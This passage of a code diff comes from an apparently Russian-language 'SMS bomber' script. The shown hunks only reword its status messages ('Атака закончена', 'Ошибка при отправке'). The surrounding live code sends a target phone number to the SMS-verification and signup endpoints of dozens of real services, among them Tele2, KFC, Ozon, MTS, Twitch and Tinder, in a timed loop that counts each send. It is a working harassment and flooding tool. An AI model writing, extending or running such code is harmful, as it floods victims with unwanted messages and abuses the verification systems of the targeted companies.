+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
@@ -9819,10 +9819,10 @@ if call == str(2):
             print('[+] NovaLinia отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
@@ -9830,10 +9830,10 @@ if call == str(2):
             print('[+] Tele2 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
@@ -9841,10 +9841,10 @@ if call == str(2):
             print('[+] Finam отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://makimaki.ru/system/callback.php',
@@ -9853,10 +9853,10 @@ if call == str(2):
             print('[+] MakiMaki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.flipkart.com/api/6/user/signup/status',
@@ -9867,10 +9867,10 @@ if call == str(2):
             print('[+] FlipKart отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
@@ -9878,10 +9878,10 @@ if call == str(2):
             print('[+] Online.ua отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
@@ -9889,10 +9889,10 @@ if call == str(2):
             print('[+] PlanetaKino отправлено!')
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ontaxi.com.ua/api/v2/web/client',
@@ -9901,10 +9901,10 @@ if call == str(2):
             print('[+] OnTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -9912,10 +9912,10 @@ if call == str(2):
             print('[+] Iqos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://smart.space/api/users/request_confirmation_code/',
@@ -9924,10 +9924,10 @@ if call == str(2):
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
@@ -9935,10 +9935,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
@@ -9948,10 +9948,10 @@ if call == str(2):
             print('[+] tarantino-family отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://apteka.ru/_action/auth/getForm/',
@@ -9964,10 +9964,10 @@ if call == str(2):
             print('[+] Apteka отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://uklon.com.ua/api/v1/account/code/send',
@@ -9976,10 +9976,10 @@ if call == str(2):
             print('[+] Uklon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
@@ -9988,10 +9988,10 @@ if call == str(2):
             print('[+] Ozon отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -10001,10 +10001,10 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
@@ -10012,10 +10012,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -10024,10 +10024,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -10035,10 +10035,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -10047,10 +10047,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -10060,10 +10060,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -10072,10 +10072,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -10086,7 +10086,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -10094,10 +10094,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -10106,10 +10106,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -10118,10 +10118,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -10131,10 +10131,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -10144,10 +10144,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -10155,10 +10155,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -10168,10 +10168,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -10179,10 +10179,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -10192,10 +10192,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -10207,10 +10207,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -10218,10 +10218,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -10229,10 +10229,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -10240,10 +10240,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -10251,10 +10251,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -10263,10 +10263,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -10275,10 +10275,10 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -10287,10 +10287,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -10300,10 +10300,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -10313,10 +10313,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -10325,10 +10325,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -10336,10 +10336,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -10347,10 +10347,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -10358,10 +10358,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -10370,10 +10370,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -10383,10 +10383,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -10395,10 +10395,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -10406,10 +10406,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -10419,10 +10419,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -10430,10 +10430,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -10441,10 +10441,10 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -10455,10 +10455,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -10467,10 +10467,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -10478,10 +10478,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -10490,10 +10490,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -10501,10 +10501,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -10514,10 +10514,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -10525,10 +10525,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
@@ -10536,10 +10536,10 @@ if call == str(2):
             print('[+] Delivery отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
